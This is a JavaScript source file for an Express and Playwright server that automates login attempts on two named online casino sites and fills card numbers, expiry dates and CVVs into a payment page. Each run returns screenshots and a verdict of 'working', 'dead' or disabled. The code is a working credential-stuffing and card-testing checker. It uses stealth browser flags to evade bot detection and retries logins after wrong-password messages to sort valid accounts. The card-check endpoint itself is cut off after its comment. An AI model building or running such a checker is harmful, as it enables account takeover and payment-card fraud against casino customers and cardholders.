/**
 * @fileoverview Sitchomatic Web — Real Browser Automation Server v1.2
 *
 * Express + Playwright server that performs LIVE browser automation.
 * Serves the webapp static files on port 8791 and provides a REST API
 * on the same port under /api/... for real credential and card checks.
 *
 * Each check opens a real headless Chromium browser, navigates to the
 * target site, fills the form, submits, and captures 4 real screenshots
 * of the actual browser window at each key moment.
 *
 * API endpoints:
 *   POST /api/login-check   — Joe Fortune or Ignition login attempt
 *   POST /api/card-check    — PPSR card check
 *   GET  /api/status        — Server health check
 */

import express from 'express';
import { chromium } from 'playwright';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
app.use(express.json());

// Serve the webapp static files
app.use(express.static(path.join(__dirname, 'webapp')));

// ── Constants ────────────────────────────────────────────────────────────────

/** Port the server listens on. */
const PORT = 8791;

/**
 * Browser launch options for all automation contexts.
 * Uses Chromium headless with stealth-style args to reduce bot detection.
 */
const BROWSER_ARGS = [
  '--no-sandbox',
  '--disable-setuid-sandbox',
  '--disable-blink-features=AutomationControlled',
  '--disable-infobars',
  '--window-size=1280,800',
];

/** Default page navigation timeout in milliseconds. */
const NAV_TIMEOUT = 30000;

/** How long to wait after submitting a form before taking a screenshot. */
const POST_SUBMIT_WAIT = 3000;

// ── Helpers ──────────────────────────────────────────────────────────────────

/**
 * Captures a viewport screenshot from a Playwright page and returns it as a
 * base64-encoded PNG data URL. Injects a "SCR X/4" badge into the top-right
 * corner of the live page before screenshotting so the label is burned into
 * the real browser image, then removes the badge afterwards.
 *
 * @param {import('playwright').Page} page - The Playwright page to capture.
 * @param {string} [label] - Optional label to burn in, e.g. 'SCR 1/4'.
 * @returns {Promise<string>} Data URL string (data:image/png;base64,...).
 */
async function captureShot(page, label) {
  const BADGE_ID = '_sitcho_scr_badge';
  try {
    if (label) {
      await page.evaluate(([id, text]) => {
        const existing = document.getElementById(id);
        if (existing) existing.remove();
        const el = document.createElement('div');
        el.id = id;
        el.style.cssText = [
          'position:fixed', 'top:12px', 'right:12px',
          'background:rgba(0,0,0,0.72)', 'color:#fff',
          'font-size:13px', 'font-weight:700', 'letter-spacing:0.5px',
          'padding:4px 11px', 'border-radius:6px', 'z-index:2147483647',
          'font-family:ui-monospace,monospace', 'pointer-events:none',
          'box-shadow:0 2px 8px rgba(0,0,0,0.5)',
        ].join(';');
        el.textContent = text;
        document.body.appendChild(el);
      }, [BADGE_ID, label]).catch(() => {});
    }
    const buf = await page.screenshot({ fullPage: false, type: 'png' });
    if (label) {
      await page.evaluate((id) => { document.getElementById(id)?.remove(); }, BADGE_ID).catch(() => {});
    }
    return `data:image/png;base64,${buf.toString('base64')}`;
  } catch {
    return '';
  }
}

/**
 * Attempts to fill a login form on the given page by trying a set of common
 * CSS selectors for email/username and password fields.
 * @param {import('playwright').Page} page - The Playwright page.
 * @param {string} username - Username or email to fill in.
 * @param {string} password - Password to fill in.
 * @returns {Promise<boolean>} True if both fields were found and filled.
 */
async function fillLoginForm(page, username, password) {
  // Strict visible-only selectors — no loose text-input fallback which caused
  // Ignition to target the same <input> for both email and password.
  const emailSelectors = [
    'input[type="email"]:visible',
    'input[name="email"]:visible',
    'input[name="username"]:visible',
    'input[name="login"]:visible',
    'input[placeholder*="email" i]:visible',
    'input[placeholder*="username" i]:visible',
    'input[id*="email" i]:visible',
    'input[id*="user" i]:visible',
    'input[id*="login" i]:visible',
  ];
  const passSelectors = [
    'input[type="password"]:visible',
    'input[name="password"]:visible',
    'input[name="pass"]:visible',
    'input[placeholder*="password" i]:visible',
    'input[id*="password" i]:visible',
  ];

  let emailHandle = null;
  let emailFilled = false;
  for (const sel of emailSelectors) {
    try {
      const el = page.locator(sel).first();
      if (await el.count() > 0 && await el.isVisible({ timeout: 3000 })) {
        await el.click();
        await el.fill('');
        await el.fill(username);
        emailHandle = await el.elementHandle();
        emailFilled = true;
        break;
      }
    } catch {}
  }

  // Pause — some sites enable the password field via JS handlers that fire
  // on email input/blur. Then explicitly wait for a password-typed field to
  // materialise before proceeding; avoids Ignition's type="text"→"password"
  // hydration race where the password selector collided with the email.
  if (emailFilled) {
    await page.waitForTimeout(600);
    await page.waitForSelector('input[type="password"]:visible', { timeout: 5000 }).catch(() => {});
  }

  let passFilled = false;
  for (const sel of passSelectors) {
    try {
      const el = page.locator(sel).first();
      if (await el.count() === 0) continue;
      if (!(await el.isVisible({ timeout: 3000 }).catch(() => false))) continue;

      // Guard against the password locator resolving to the SAME element as
      // the email — which would overwrite the email value with the password.
      if (emailHandle) {
        const passHandle = await el.elementHandle();
        if (passHandle && emailHandle) {
          const sameNode = await page.evaluate(([a, b]) => a === b, [emailHandle, passHandle]).catch(() => false);
          if (sameNode) continue;
        }
      }

      await el.click();
      await el.fill('');
      await el.fill(password);
      passFilled = true;
      break;
    } catch {}
  }

  // Short settle time after password entry before caller proceeds
  if (passFilled) await page.waitForTimeout(300);

  return emailFilled && passFilled;
}

/**
 * Attempts to dismiss any visible cookie consent / GDPR popup by clicking
 * common accept/dismiss buttons. Runs silently — never throws.
 *
 * Tries text-based button matches first (most reliable across sites), then
 * falls back to common class/id/attribute selectors used by popular consent
 * management platforms (OneTrust, Cookiebot, TrustArc, etc.).
 *
 * Should be called after every page.goto() and after form submissions that
 * may trigger a new page load with a fresh consent overlay.
 *
 * @param {import('playwright').Page} page - The Playwright page.
 * @returns {Promise<void>}
 */
async function dismissCookiePopup(page) {
  // Text targets — include <button>, <a>, [role=button], generic clickables.
  // Covers Joe Fortune ("Got It" / "I agree") and Ignition ("Accept" / "I Understand")
  // which render as anchor tags or divs, not real <button>s.
  const textTargets = [
    'Accept All Cookies', 'Accept all cookies',
    'Accept All', 'Accept all',
    'Accept & Continue', 'Accept and continue',
    'Accept Cookies', 'Accept cookies',
    'Accept',
    'Allow All Cookies', 'Allow all cookies',
    'Allow All', 'Allow all',
    'I Accept', 'I accept',
    'I Agree', 'I agree',
    'I Understand', 'I understand',
    'Agree & Close', 'Agree and close',
    'Agree',
    'Got it', 'Got It', 'GOT IT',
    'Yes, I Agree', 'Yes, I agree',
    'That\'s OK', 'That\'s fine',
    'OK', 'Ok',
    'Close', 'Dismiss',
    'Continue',
  ];

  const roleSelectors = textTargets.flatMap(t => [
    `button:has-text("${t}")`,
    `a:has-text("${t}")`,
    `[role="button"]:has-text("${t}")`,
    `div[role="button"]:has-text("${t}")`,
    `span[role="button"]:has-text("${t}")`,
  ]);

  const attrSelectors = [
    // OneTrust
    '#onetrust-accept-btn-handler',
    '.onetrust-close-btn-handler',
    // Cookiebot
    '#CybotCookiebotDialogBodyLevelButtonLevelOptinAllowAll',
    '#CybotCookiebotDialogBodyButtonAccept',
    // TrustArc
    '.trustarc-agree-btn',
    '.truste_popframe .pdynamicbutton',
    // Didomi
    '#didomi-notice-agree-button',
    // Generic consent platforms — buttons, anchors and role=button inside banners
    '[id*="cookie"][id*="accept" i]',
    '[id*="cookie"][id*="allow" i]',
    '[class*="cookie"][class*="accept" i]',
    '[class*="cookie-consent"] button',
    '[class*="cookie-consent"] a',
    '[class*="cookie-banner"] button',
    '[class*="cookie-banner"] a',
    '[class*="cookie-notice"] button',
    '[class*="cookie-notice"] a',
    '[class*="gdpr"] button',
    '[class*="consent"] button',
    '[aria-label*="accept" i][role="button"]',
    '[aria-label*="accept cookies" i]',
    '[data-testid*="cookie-accept" i]',
    '[data-testid*="consent-accept" i]',
  ];

  const tryOnce = async () => {
    for (const sel of [...roleSelectors, ...attrSelectors]) {
      try {
        const el = page.locator(sel).first();
        if (await el.count() > 0 && await el.isVisible({ timeout: 250 }).catch(() => false)) {
          await el.click({ timeout: 1200, force: false }).catch(async () => {
            // Fallback: JS click in case the element is covered
            await el.evaluate(n => n.click()).catch(() => {});
          });
          return true;
        }
      } catch {}
    }
    return false;
  };

  // First pass
  if (await tryOnce()) {
    await page.waitForTimeout(400).catch(() => {});
    return;
  }
  // Some banners mount after a short delay — retry after 1.2s
  await page.waitForTimeout(1200).catch(() => {});
  await tryOnce();
}

/**
 * Clicks the login/submit button on a login form by trying common selectors.
 * @param {import('playwright').Page} page - The Playwright page.
 * @returns {Promise<boolean>} True if a submit button was found and clicked.
 */
async function clickSubmit(page) {
  const submitSelectors = [
    'button[type="submit"]',
    'input[type="submit"]',
    'button:has-text("Log in")',
    'button:has-text("Login")',
    'button:has-text("Sign in")',
    'button:has-text("Sign In")',
    'button:has-text("Submit")',
    '[data-testid*="submit" i]',
    '[data-testid*="login" i]',
    '.login-btn',
    '.btn-login',
    '.submit-btn',
  ];
  for (const sel of submitSelectors) {
    try {
      const el = page.locator(sel).first();
      if (await el.count() > 0 && await el.isVisible()) {
        await el.click();
        return true;
      }
    } catch {}
  }
  return false;
}

/**
 * Analyses the page content after a login attempt to determine the outcome.
 *
 * Strategy (strict — avoids false positives from Cloudflare/anti-bot redirects):
 *  1. Check for hard failure text first (disabled, locked, invalid creds).
 *  2. Only call "working" when MULTIPLE strong success signals are present
 *     (URL path change to account area AND success body text), or when a
 *     high-confidence success keyword appears in the page text.
 *  3. A bare URL redirect is NOT sufficient for "working" — casino sites
 *     redirect to Cloudflare challenges or error pages on every bad login.
 *
 * @param {import('playwright').Page} page - The Playwright page after form submission.
 * @param {string} loginUrl - The original login URL.
 * @returns {Promise<{outcome: string, note: string}>}
 */
async function determineLoginOutcome(page, loginUrl) {
  const url = page.url().toLowerCase();
  const bodyText = (await page.textContent('body').catch(() => '')).toLowerCase();

  // ── Hard failure signals (check first) ──────────────────────────────────
  // Joe Fortune exact: "Your account has been disabled. Please, contact Customer Service."
  // This is the ONLY signal that indicates permanent disable — red textbox below login form.
  if (/your account has been disabled\.\s*please,?\s*contact\s+customer\s+service/i.test(bodyText)) {
    return { outcome: 'permDisabled', note: 'Joe Fortune — account permanently disabled (contact Customer Service)' };
  }
  // Joe Fortune exact: "Sorry, your account has been temporarily disabled due to
  // too many failed login attempts. Contact us immediately to re-enable."
  if (/temporarily disabled due to too many failed login attempt/i.test(bodyText)) {
    return { outcome: 'tempDisabled', note: 'Joe Fortune — temporarily disabled (too many failed attempts). Retry eligible after ~1 hour.' };
  }
  // Joe Fortune exact — attempt 1 wrong password:
  // "Oops! Your email and/or password are incorrect. Please check that your CAPS lock is not on and try again."
  if (/oops!\s*your email and\/or password are incorrect\.\s*please check that your caps lock/i.test(bodyText)) {
    return { outcome: 'noAcc', note: 'Joe Fortune — incorrect email/password (attempt 1)' };
  }
  // Joe Fortune exact — attempt 2+ wrong password (warning about blocking):
  // "Your email and/or password remain incorrect. Further failed attempts may result in your account being blocked."
  if (/your email and\/or password remain incorrect\.\s*further failed attempts may result/i.test(bodyText)) {
    return { outcome: 'noAcc', note: 'Joe Fortune — email/password remain incorrect (account does not exist or wrong credentials)' };
  }
  if (/email.*not.*found|account.*not.*found|user.*not.*found|no account.*found/i.test(bodyText)) {
    return { outcome: 'noAcc', note: 'No account found for this email' };
  }
  if (/invalid.*password|incorrect.*password|wrong.*password|password.*incorrect/i.test(bodyText)) {
    return { outcome: 'noAcc', note: 'Invalid password' };
  }
  if (/invalid.*credential|incorrect.*credential|login.*failed|sign.?in.*failed/i.test(bodyText)) {
    return { outcome: 'noAcc', note: 'Invalid credentials' };
  }
  if (/your account.*banned|account.*banned|banned.*account/i.test(bodyText)) {
    return { outcome: 'permDisabled', note: 'Account banned' };
  }

  // ── Joe Fortune: specific success signals ───────────────────────────────
  // Signal 1: green "Welcome!" banner with checkmark shown immediately after login
  if (/^\s*welcome\s*!?\s*$/im.test(bodyText) || /✓.*welcome|welcome.*✓/i.test(bodyText)) {
    return { outcome: 'working', note: 'Joe Fortune — Welcome! banner detected (login successful)' };
  }
  // Signal 2: redirected to lobby — nav shows "JOE FORTUNE" + DEPOSIT button + account icon
  // Detected by URL leaving /login and body containing "deposit" without login-page content
  const urlPath = (() => { try { return new URL(page.url()).pathname.toLowerCase(); } catch { return ''; } })();
  const isOffLoginPage = !url.includes('/login')
    && !url.includes('/sign-in')
    && !url.includes('/signin')
    && !url.includes('overlay=login')
    && !url.includes('modal=login')
    && !url.includes('action=login');
  if (isOffLoginPage && /hot pokies|new & exclusive|live casino|specialty games/i.test(bodyText)) {
    return { outcome: 'working', note: 'Joe Fortune — casino lobby detected (login successful)' };
  }
  if (isOffLoginPage && /deposit/i.test(bodyText) && /joe fortune/i.test(bodyText) && /welcome back/i.test(bodyText)) {
    return { outcome: 'working', note: 'Joe Fortune — Welcome Back screen detected (login successful)' };
  }

  // ── General strong success signals ──────────────────────────────────────
  const urlIndicatesSuccess = ['/account', '/dashboard', '/cashier', '/lobby', '/deposit', '/withdraw', '/profile', '/my-account', '/game', '/casino'].some(p => urlPath.startsWith(p));
  const strongSuccessPatterns = [
    /welcome back/i, /account balance/i, /your balance/i, /\$[\d,]+\.\d{2}/,
    /make a deposit/i, /account overview/i,
    /logout/i, /log out/i, /sign out/i, /withdrawal/i,
  ];
  const hasStrongSuccessText = strongSuccessPatterns.some(p => p.test(bodyText));
  const softSuccessPatterns = [/hot pokies/i, /live casino/i, /lobby/i, /balance/i];
  const hasSoftSuccessText = softSuccessPatterns.some(p => p.test(bodyText));

  if (hasStrongSuccessText && isOffLoginPage) {
    return { outcome: 'working', note: 'Login successful — account area detected' };
  }
  if (urlIndicatesSuccess && hasSoftSuccessText) {
    return { outcome: 'working', note: `Login successful — redirected to ${urlPath}` };
  }

  // ── Catch-all failure signals ────────────────────────────────────────────
  if (/cloudflare|captcha|bot.*detected|access denied|403 forbidden|429 too many/i.test(bodyText)) {
    return { outcome: 'noAcc', note: 'Bot/Cloudflare challenge — unable to verify' };
  }
  if (/error|invalid|incorrect|failed/i.test(bodyText)) {
    return { outcome: 'noAcc', note: 'Login failed — check screenshots for details' };
  }

  return { outcome: 'noAcc', note: 'Login result unclear — review screenshots' };
}

/**
 * Attempts to fill a card payment form on a page by trying common credit card
 * field selectors. Returns true if the card number field was found and filled.
 * @param {import('playwright').Page} page - The Playwright page.
 * @param {string} number - Card number.
 * @param {string} mm - Expiry month (2 digits).
 * @param {string} yy - Expiry year (2 digits).
 * @param {string} cvv - CVV/CVC code.
 * @returns {Promise<boolean>} True if the card number field was located and filled.
 */
async function fillCardForm(page, number, mm, yy, cvv) {
  const cardNumSelectors = [
    'input[name*="card" i][name*="number" i]',
    'input[id*="card" i][id*="number" i]',
    'input[placeholder*="card number" i]',
    'input[placeholder*="card no" i]',
    'input[data-testid*="card" i]',
    'input[autocomplete="cc-number"]',
    'input[name="cardNumber"]',
    'input[name="card_number"]',
    'input[name="number"]',
  ];
  const expirySelectors = [
    'input[autocomplete="cc-exp"]',
    'input[name*="expiry" i]',
    'input[name*="expiration" i]',
    'input[placeholder*="MM/YY" i]',
    'input[placeholder*="expiry" i]',
  ];
  const cvvSelectors = [
    'input[autocomplete="cc-csc"]',
    'input[name*="cvv" i]',
    'input[name*="cvc" i]',
    'input[name*="csc" i]',
    'input[placeholder*="cvv" i]',
    'input[placeholder*="cvc" i]',
    'input[placeholder*="security code" i]',
  ];

  let cardFilled = false;
  for (const sel of cardNumSelectors) {
    try {
      const el = page.locator(sel).first();
      if (await el.count() > 0 && await el.isVisible()) {
        await el.fill(number);
        cardFilled = true;
        break;
      }
    } catch {}
  }

  // Try combined expiry field (MM/YY)
  for (const sel of expirySelectors) {
    try {
      const el = page.locator(sel).first();
      if (await el.count() > 0 && await el.isVisible()) {
        await el.fill(`${mm}/${yy}`);
        break;
      }
    } catch {}
  }

  // Try separate month/year fields
  try {
    const mmEl = page.locator('select[name*="month" i], input[name*="month" i]').first();
    if (await mmEl.count() > 0) await mmEl.fill(mm);
    const yyEl = page.locator('select[name*="year" i], input[name*="year" i]').first();
    if (await yyEl.count() > 0) await yyEl.fill(`20${yy}`);
  } catch {}

  for (const sel of cvvSelectors) {
    try {
      const el = page.locator(sel).first();
      if (await el.count() > 0 && await el.isVisible()) {
        await el.fill(cvv);
        break;
      }
    } catch {}
  }

  return cardFilled;
}

/**
 * Analyses page content after a card check to determine the result.
 * @param {import('playwright').Page} page - The Playwright page after submission.
 * @returns {Promise<{outcome: string, note: string}>} Outcome and note.
 */
async function determineCardOutcome(page) {
  const bodyText = (await page.textContent('body').catch(() => '')).toLowerCase();

  if (/declined|do not honor|insufficient funds|card.*not.*accepted|payment.*failed/i.test(bodyText)) {
    return { outcome: 'dead', note: 'Card declined by payment processor' };
  }
  if (/approved|success|payment.*complete|transaction.*approved|authorised/i.test(bodyText)) {
    return { outcome: 'working', note: 'Card approved' };
  }
  if (/invalid.*card|card.*invalid|card.*number.*invalid/i.test(bodyText)) {
    return { outcome: 'dead', note: 'Invalid card number' };
  }
  if (/expired/i.test(bodyText)) {
    return { outcome: 'dead', note: 'Card expired' };
  }
  if (/(payment|card|transaction|processor).{0,30}error|error.{0,30}(payment|card|transaction|processing)/i.test(bodyText)) {
    return { outcome: 'dead', note: 'Error during card check' };
  }

  return { outcome: 'dead', note: 'No clear result — check screenshots' };
}

// ── API: Status ──────────────────────────────────────────────────────────────

/**
 * GET /api/status
 * Returns server health status so the webapp can detect if the automation
 * backend is available before starting a run.
 */
app.get('/api/status', (req, res) => {
  res.json({ ok: true, version: '1.2.0', mode: 'live' });
});

// ── API: Login Check ─────────────────────────────────────────────────────────

/** Maximum number of login attempts before declaring noAcc. */
const MAX_LOGIN_ATTEMPTS = 4;

/** Maximum time to poll for a login response before giving up (ms). */
const RESPONSE_POLL_MS = 15000;

/** Poll interval while waiting for a response (ms). */
const POLL_INTERVAL_MS = 300;

/**
 * Response type codes returned by waitForLoginResponse.
 * @readonly
 * @enum {string}
 */
const RESP = {
  SUCCESS:       'success',
  PERM_DISABLED: 'permDisabled',
  TEMP_DISABLED: 'tempDisabled',
  WRONG_PASS_1:  'wrongPass1',   // "Oops! Your email and/or password are incorrect"
  WRONG_PASS_2:  'wrongPass2',   // "Your email and/or password remain incorrect"
  UNKNOWN:       'unknown',      // timed out with no recognised pattern
};

/**
 * Polls the page body every POLL_INTERVAL_MS for up to maxWaitMs to detect
 * a known login response. Returns a RESP code as soon as one is found, or
 * RESP.UNKNOWN if the timeout expires with no match.
 *
 * Checking this way (rather than a fixed wait) means we react the moment
 * Joe Fortune renders a result rather than always waiting the full delay.
 *
 * @param {import('playwright').Page} page
 * @param {number} [maxWaitMs=5000]
 * @returns {Promise<string>} One of the RESP constants.
 */
async function waitForLoginResponse(page, maxWaitMs = RESPONSE_POLL_MS, site = 'joe') {
  const deadline = Date.now() + maxWaitMs;
  while (Date.now() < deadline) {
    const body = (await page.textContent('body').catch(() => '')).toLowerCase();
    const url  = (page.url() || '').toLowerCase();

    // ── Disabled (check before success — these appear on the login page) ──
    if (/your account has been disabled\.\s*please,?\s*contact\s+customer\s+service/i.test(body)) return RESP.PERM_DISABLED;
    if (/temporarily disabled due to too many failed login attempt/i.test(body)) return RESP.TEMP_DISABLED;

    // ── Wrong password signals (also appear on the login page) ────────────
    if (/your email and\/or password remain incorrect.*further failed attempt/i.test(body)) return RESP.WRONG_PASS_2;
    if (/oops.*your email and\/or password are incorrect.*caps lock/i.test(body)) return RESP.WRONG_PASS_1;

    // Ignition-specific wrong-password text
    if (site === 'ign') {
      if (/incorrect (email|username|password)|invalid (email|username|password|credentials)/i.test(body)) return RESP.WRONG_PASS_1;
    }

    // ── Success: URL must have left the login page AND auth-only signals ──
    const isOffLoginPage = !url.includes('/login')
      && !url.includes('/sign-in')
      && !url.includes('/signin')
      && !url.includes('overlay=login')
      && !url.includes('modal=login')
      && !url.includes('action=login');

    if (isOffLoginPage && (await isLoggedIn(page, site))) return RESP.SUCCESS;

    await page.waitForTimeout(POLL_INTERVAL_MS);
  }
  return RESP.UNKNOWN;
}

/**
 * Site-aware logged-in check. Uses DOM/cookie signals that only exist for
 * authenticated users — NOT promotional marketing text which appears on the
 * logged-out homepage too.
 *
 * @param {import('playwright').Page} page
 * @param {string} site - 'joe' | 'ign'
 * @returns {Promise<boolean>}
 */
async function isLoggedIn(page, site) {
  try {
    // 1. Auth-only DOM elements — logout button / profile menu / balance chip.
    //    These are absent when logged out.
    const authOnlyLocators = site === 'ign'
      ? [
          'a:has-text("Log Out")', 'a:has-text("Log out")', 'a:has-text("Logout")',
          'button:has-text("Log Out")', 'button:has-text("Logout")',
          '[data-testid*="logout" i]',
          '[class*="user-menu"]', '[class*="account-menu"]',
          '[class*="balance"]', '[data-testid*="balance" i]',
          'a[href*="/cashier"]', 'a[href*="/account"]:has-text("Account")',
          'button:has-text("Deposit")',
        ]
      : [
          // Joe Fortune: logout link, balance, user avatar, deposit button
          'a:has-text("Logout")', 'a:has-text("Log Out")', 'a:has-text("Sign Out")',
          'button:has-text("Logout")', 'button:has-text("Deposit")',
          '[class*="user-avatar"]', '[class*="profile-avatar"]',
          '[class*="balance"]', '[data-testid*="balance" i]',
          'a[href*="/account"]', 'a[href*="/cashier"]',
        ];

    for (const sel of authOnlyLocators) {
      const el = page.locator(sel).first();
      if ((await el.count().catch(() => 0)) > 0 && (await el.isVisible({ timeout: 150 }).catch(() => false))) {
        return true;
      }
    }

    // 2. Auth cookies — casino sites typically set a session/auth cookie on
    //    successful login. Presence of a cookie whose name matches typical
    //    auth patterns is a strong secondary signal.
    const cookies = await page.context().cookies().catch(() => []);
    const authCookie = cookies.find(c => /token|auth|session|jwt|sid|bearer/i.test(c.name) && c.value && c.value.length > 10);
    if (authCookie) {
      // Cookie alone isn't enough (some sites set session cookies pre-login).
      // Combine with "no visible password input" — if the login form is gone
      // AND we have an auth-shaped cookie, treat as logged in.
      const passVisible = await page.locator('input[type="password"]:visible').first().isVisible({ timeout: 150 }).catch(() => false);
      if (!passVisible) return true;
    }
  } catch { /* ignore */ }
  return false;
}

/**
 * POST /api/login-check
 * Performs a real Playwright login attempt against the target casino site.
 *
 * Flow (single page — NO navigation between submits):
 *  1. Navigate to login page ONCE, dismiss cookies, fill credentials → SCR 1/4
 *  2. Submit #1, poll for known response → SCR 2/4 (same page)
 *  3. If wrong-password: re-fill same fields + submit #2 → SCR 3/4 (same page)
 *  4. 2000ms settle, read final DOM/URL in place → SCR 4/4 (same page)
 *  5. Session end: clear cookies + localStorage + sessionStorage, close browser
 *
 * Cookies / localStorage / JS state are preserved across all submits so the
 * screenshots form a clean visual timeline of the same page reacting to each
 * request. Only at session end is state wiped.
 *
 * Request body:
 *   site       {string} 'joe' | 'ign'
 *   username   {string}
 *   password   {string}
 *   loginUrl   {string}
 *   timeout    {number} optional page timeout ms
 *
 * Response: { outcome, note, shots: [4 base64 PNGs] }
 */
app.post('/api/login-check', async (req, res) => {
  const { site, username, password, loginUrl, timeout = NAV_TIMEOUT, liveView = false } = req.body;
  if (!username || !password || !loginUrl) {
    return res.status(400).json({ error: 'Missing username, password, or loginUrl' });
  }

  let browser;
  const shots = ['', '', '', ''];
  let outcome = 'noAcc';
  let note = 'Check did not complete';

  try {
    // liveView: small visible Chromium window so the user can watch each step.
    // Uses a reduced viewport and slowMo so the flow mirrors recorder timing.
    const launchArgs = liveView
      ? [...BROWSER_ARGS, '--window-size=540,420', '--window-position=40,40']
      : BROWSER_ARGS;
    browser = await chromium.launch({
      headless: !liveView,
      args: launchArgs,
      slowMo: liveView ? 120 : 0,
    });
    const context = await browser.newContext({
      viewport: liveView ? { width: 540, height: 420 } : { width: 1280, height: 800 },
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
      ignoreHTTPSErrors: true,
    });
    const page = await context.newPage();
    page.setDefaultTimeout(timeout);

    // ── Step 1: Load login page ───────────────────────────────────────────
    // Bulletproofing: if navigation fails (cert, DNS, timeout) we still want
    // to return a screenshot of the error state so the user has visual proof
    // rather than 4 blank slots.
    try {
      await page.goto(loginUrl, { waitUntil: 'domcontentloaded', timeout });
    } catch (navErr) {
      note = `Navigation failed: ${navErr.message.split('\n')[0]}`;
      shots[0] = await captureShot(page, 'SCR 1/4').catch(() => '');
      shots[1] = shots[0]; shots[2] = shots[0]; shots[3] = shots[0];
      return res.json({ outcome: 'noAcc', note, shots });
    }
    // Ignition takes longer to paint the login overlay + cookie banner.
    // Wait 6000ms for Ignition, 2000ms for all other sites.
    const initialLoadWait = site === 'ign' ? 6000 : 2000;
    await page.waitForTimeout(initialLoadWait);
    await dismissCookiePopup(page);

    const filled = await fillLoginForm(page, username, password);
    if (!filled) note = 'Could not locate login form fields on page';

    // SCR 1/4 — 0.7s after the last field click (both fields now filled)
    await page.waitForTimeout(700);
    shots[0] = await captureShot(page, 'SCR 1/4');

    // ── Step 2: First submit → SCR 2/4 (2000ms fixed) → poll outcome ─────
    // Screenshot timing is hardcoded: 2000ms after first submit click so the
    // page has time to render the immediate response before we capture it.
    // After the screenshot we poll to confirm the outcome (fast if already visible).
    let respType = RESP.UNKNOWN;
    const siteName = site === 'ign' ? 'Ignition' : 'Joe Fortune';

    const clicked1 = await clickSubmit(page);
    if (!clicked1) await page.keyboard.press('Enter');

    await page.waitForTimeout(2000); // hardcoded: 2000ms after 1st submit
    await dismissCookiePopup(page);
    shots[1] = await captureShot(page, 'SCR 2/4');

    // Poll for outcome — returns immediately if the response is already visible
    respType = await waitForLoginResponse(page, RESPONSE_POLL_MS, site);

    // Evaluate result after first attempt
    if (respType === RESP.SUCCESS) {
      outcome = 'working';
      note = `${siteName} — login successful`;
    } else if (respType === RESP.PERM_DISABLED) {
      outcome = 'permDisabled';
      note = `${siteName} — account permanently disabled (contact Customer Service)`;
    } else if (respType === RESP.TEMP_DISABLED) {
      outcome = 'tempDisabled';
      note = `${siteName} — temporarily disabled (too many failed attempts). Retry eligible after ~1 hour.`;
    }

    // ── Step 3: Retry submit → SCR 3/4 (2500ms fixed) → poll outcome ─────
    // Screenshot taken 2500ms after the second submit click.
    if (respType === RESP.WRONG_PASS_1 || respType === RESP.WRONG_PASS_2 || respType === RESP.UNKNOWN) {
      await fillLoginForm(page, username, password);
      const clicked2 = await clickSubmit(page);
      if (!clicked2) await page.keyboard.press('Enter');

      await page.waitForTimeout(2500); // hardcoded: 2500ms after 2nd submit
      await dismissCookiePopup(page);
      shots[2] = await captureShot(page, 'SCR 3/4');

      respType = await waitForLoginResponse(page, RESPONSE_POLL_MS, site);

      if (respType === RESP.SUCCESS) {
        outcome = 'working';
        note = `${siteName} — login successful (attempt 2)`;
      } else if (respType === RESP.PERM_DISABLED) {
        outcome = 'permDisabled';
        note = `${siteName} — account permanently disabled (contact Customer Service)`;
      } else if (respType === RESP.TEMP_DISABLED) {
        outcome = 'tempDisabled';
        note = `${siteName} — temporarily disabled (too many failed attempts). Retry eligible after ~1 hour.`;
      } else if (respType === RESP.WRONG_PASS_2) {
        outcome = 'noAcc';
        note = `${siteName} — incorrect credentials on retry (account does not exist or wrong password)`;
      }
    } else {
      // Outcome already determined after attempt 1 — capture current state for SCR 3/4
      shots[2] = await captureShot(page, 'SCR 3/4');
    }

    // ── Step 4: In-place final state → SCR 4/4 (2000ms settle) ─────────────
    // DO NOT navigate — we want the exact page state resulting from the user's
    // submits, with cookies/localStorage/JS state intact. This gives a clean
    // visual timeline across SCR 1–4 on a single URL. We only read signals
    // from the current page.
    const needsFallback = outcome !== 'working' && outcome !== 'permDisabled' && outcome !== 'tempDisabled';
    await page.waitForTimeout(2000).catch(() => {}); // 2000ms settle before SCR 4/4
    await dismissCookiePopup(page);

    if (needsFallback) {
      const finalUrl  = (page.url() || '').toLowerCase();
      const finalBody = ((await page.textContent('body').catch(() => '')) || '').toLowerCase();

      // URL-based success: moved off the login page via normal site nav
      const offLoginPage = !finalUrl.includes('/login')
        && !finalUrl.includes('/sign-in')
        && !finalUrl.includes('/signin')
        && !finalUrl.includes('overlay=login')
        && !finalUrl.includes('modal=login')
        && !finalUrl.includes('action=login');

      // Site-aware auth-only check (DOM locators + auth cookie + no password input).
      // Avoids false positives from generic marketing text on logged-out homepages
      // (e.g. Ignition's `?overlay=login` landing page).
      const loggedIn = await isLoggedIn(page, site);

      if (offLoginPage && loggedIn) {
        outcome = 'working';
        note = `${siteName} — auth-only signals detected on current page (no navigation)`;
      } else if (/your account has been disabled\.\s*please,?\s*contact\s+customer\s+service/i.test(finalBody)) {
        outcome = 'permDisabled';
        note = `${siteName} — account permanently disabled (detected on final state)`;
      } else if (/temporarily disabled due to too many failed login attempt/i.test(finalBody)) {
        outcome = 'tempDisabled';
        note = `${siteName} — temporarily disabled (detected on final state)`;
      } else {
        outcome = 'noAcc';
        note = `${siteName} — no success signal detected after retries`;
      }
    }

    shots[3] = await captureShot(page, 'SCR 4/4');

    // ── Session end: clear cookies + storage for hygiene, THEN close ──────
    // Only at the very end of the session — never between submits.
    await context.clearCookies().catch(() => {});
    await page.evaluate(() => {
      try { localStorage.clear(); sessionStorage.clear(); } catch { /* ignore */ }
    }).catch(() => {});

  } catch (err) {
    note = `Automation error: ${err.message}`;
    outcome = 'noAcc';
  } finally {
    if (browser) await browser.close().catch(() => {});
  }

  if (!res.headersSent) res.json({ outcome, note, shots });
});

// ── API: Card Check ───────────────────────────────────────────────────────────

/**
 * POST /api/card-check
 * Performs a real Playwright card check against the configured PPSR/payment URL.
 * Takes 4 real browser screenshots at key moments.
 *
 * Request body:
 *   number     {string} card number digits
 *   mm         {string} expiry month (2-digit)
 *   yy         {string} expiry year (2-digit)
 *   cvv        {string} CVV/CVC code
 *   ppsrUrl    {string} URL of the card check page
 *   timeout    {number} optional page timeout ms (default 30000)
 *
 * Response:
 *   outcome    {string} 'working' | 'dead'
 *   note       {string} human-readable result description
 *   shots      {string[]} array of 4 base64 PNG data URLs
 *     [0] page loaded, form visible
 *     [1] form filled with card details
 *     [2] first response after submit
 *     [3] final result state
 */
